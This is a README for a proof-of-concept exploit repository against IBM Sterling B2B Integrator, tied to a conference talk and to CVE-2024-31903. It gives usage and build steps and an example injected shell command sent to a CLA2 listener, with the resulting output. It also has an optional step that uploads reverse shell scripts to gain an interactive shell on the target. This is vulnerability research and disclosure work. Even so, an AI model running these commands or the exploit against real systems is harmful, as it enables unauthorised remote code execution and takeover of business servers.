# IBM Sterling B2B Integrator PoC

Proof of concept code for the exploitation of the vulnerabilities discovered against IBM Sterling B2B Integrator, versions 6.2.0.0 to 6.2.0.2, and 6.0.0.0 to 6.1.2.5 for Linux, Windows and AIX systems:

- LPE Command Injection - if authentication is disabled
- Pre-auth Deserialisation RCE - assigned CVE-2024-31903, see the relevant IBM advisory here: https://www.ibm.com/support/pages/node/7172233 
 
More details about these issues can be found in my DistricCon talk "To B or not 2B: Breaking the IBM B2B Integrator with, and without authentication":
 
https://www.districtcon.org/bios-and-talks-2025/to-b-or-not-to-b


## Repo Structure

Most of this code in this repo refers to the LPE command injection attack.

The Python binary client `bin_client.py` can be used to send messages manually to CLA2, allowing exploitation of the deserialisation RCE vulnerability. 


## Usage

```bash
$ java Main
$ Usage: Main <cmdLine> <outfile_or_SEND> [host] [port]
```

The PoC accepts two parameters:
- The shell command to be executed by the target CLA2 client
- A path to write the serialised Java message to disk, to then be analysed further/sent manually with something like `bin_client.py`, or the string "SEND" to send it immediately to host:port where a CLA2 client is listening on


## Instructions 

The source code included in this repository is deliberately incomplete, as certain classes from the CLA2 susbystem are required. Depending on filesystem permissions of the installation directory, you might be able to access the JAR files 

Assuming you have retrieved the relevant files from the JAR decompilation. Will not be uplaoded here as they constitute IBM IP

1. Decompile `CLA2Client.jar` 

2. In the decompiled code, locate files `CmdLine2Result.java` and `CmdLine2Parms.java` 

3. Copy and paste them next to `Main.java` to replicate the directory structure of the original application's java package

```
/src/com/sterlingcommerce/woodstock/services/cmdline2/
```

4. Compile the PoC program - ideally using the JDK packaged by the application 

```bash
${B2BHOME}/INSTALL/jdk/bin/javac src/com/sterlingcommerce/woodstock/services/cmdline2/*.java
```

5.	Execute it - again, using the JDK packaged by the application if possible

```bash
${B2BHOME}/appl/SFG/INSTALL/jdk/bin/java -classpath src/ com.sterlingcommerce.woodstock.services.cmdline2.Main '/bin/sh -c "id > /tmp/result"' SEND 127.0.0.1 5052
[+] Creating object...
[+] Sending object to 127.0.0.1:5052...
[+] ...Sent!
[+] Receiving header...
[+] ...header received: RESULT
[+] Receiving result...
[+] Result received:
##[DEBUG]## CmdLine2Result:
fileSize=0
outputNameLong=null
outputNameShort=null
******* end of CmdLine2Result *******
[+] clr.statusRpt:       null
[+] clr.exceptionString: null
[+] clr.somethingToLog:  CmdLine2Thread.runCommand: cmdLine before execution=/bin/sh -c "id > /tmp/result"
##[REMOTE DEBUG]## parm0=/bin/sh
##[REMOTE DEBUG]## parm1=-c
##[REMOTE DEBUG]## parm2=id > /tmp/result 
```

6.	(Optional) To obtain a fully interactive shell, upload the `revshell.py` and `revshell_listener.py` scripts onto the target system, and start the listener. Then, replace the PoC's command parameter with an invocation of the reverse shell script as below:   

```bash 
${B2BHOME}/INSTALL/jdk/bin/java -classpath src/ com.sterlingcommerce.woodstock.services.cmdline2.Main 'python3 /tmp/revshell.py 9090' SEND
```

